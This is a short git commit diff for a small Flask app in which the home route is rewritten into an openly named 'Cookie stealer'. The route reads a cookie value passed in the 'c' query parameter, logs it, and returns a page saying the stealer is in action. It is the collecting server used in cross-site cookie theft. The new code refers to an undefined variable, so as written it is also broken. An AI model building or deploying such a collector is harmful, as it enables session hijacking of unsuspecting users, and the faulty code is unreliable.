1b1a71953280263f381320e6294888c336191e46
MatthiasLHK <matthiasli1998@hotmail.com>
2021-03-21 14:02:30 +0800

    master

--- app/main.py
+++ app/main.py
@@ -5,6 +5,5 @@ app = Flask(__name__)
 @app.route("/")
 def home_view():
     cookie = request.args.get('c')
-    if(cookie == None):
-        cookie = "LOL"
-    return "<h1>This is the cookie: {cookie}</h>"
+    print("This is the cookie: " + c)
+    return "<h1>Cookie stealer in action</h>"
